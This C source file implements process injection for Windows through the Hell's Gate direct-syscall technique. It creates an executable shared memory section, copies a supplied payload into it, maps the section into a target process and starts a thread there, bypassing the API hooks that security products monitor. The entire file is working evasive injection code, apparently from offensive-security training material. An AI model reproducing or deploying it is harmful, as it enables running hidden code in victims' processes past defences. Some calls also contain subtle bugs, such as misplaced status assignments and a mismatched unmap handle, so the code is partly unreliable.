#include "HellsGate.h"
#include <stdio.h>

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
	// Init local vars
	NTSTATUS		status = 0x0;
	HANDLE          hSection = NULL, hThread = NULL;
	PVOID			pAllocatedAddress = NULL;
	PVOID			pAllocatedRemoteAddress = NULL;
	PVOID			pExecAddress = NULL;
	LARGE_INTEGER	liMaxSize = { .LowPart = sPayloadSize };
	SIZE_T          sViewSize = 0;
	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

	// Allocating local map view 
	HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
	if (status = HellDescent(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		&liMaxSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if (status = HellDescent(
		hSection,
		GetCurrentProcessHandle(),
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);

	// Writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();

	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);

	// Allocating remote map view 
	if (!bIsLocalInjection) {
		HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
		if ((status = HellDescent(
			hSection,
			hProcess,
			&pAllocatedRemoteAddress,
			NULL, NULL, NULL,
			&sViewSize,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READWRITE
		)) != 0x0) {
			printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}
		printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
	}

	// Executing the payload via thread creation
	pExecAddress = pAllocatedAddress;
	if (!bIsLocalInjection) {
		pExecAddress = pAllocatedRemoteAddress;
	}

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
	HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
	if ((HellDescent(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		pExecAddress,
		NULL,
		NULL,
		NULL, NULL, NULL,
		NULL
	)) != 0x0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}
	printf("[+] DONE \n");
	if (hThread != 0x0) {
		printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
	}

	// Waiting for the thread to finish
	HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
	if ((status = HellDescent(
		hThread,
		FALSE,
		NULL
	)) != 0x0) {
		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Unmapping the local view
	HellsGate(g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
	if ((status = HellDescent(
		hProcess,
		pAllocatedAddress
	)) != 0x0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Closing the section handle
	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = HellDescent(
		hSection
	)) != 0x0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	return TRUE;
}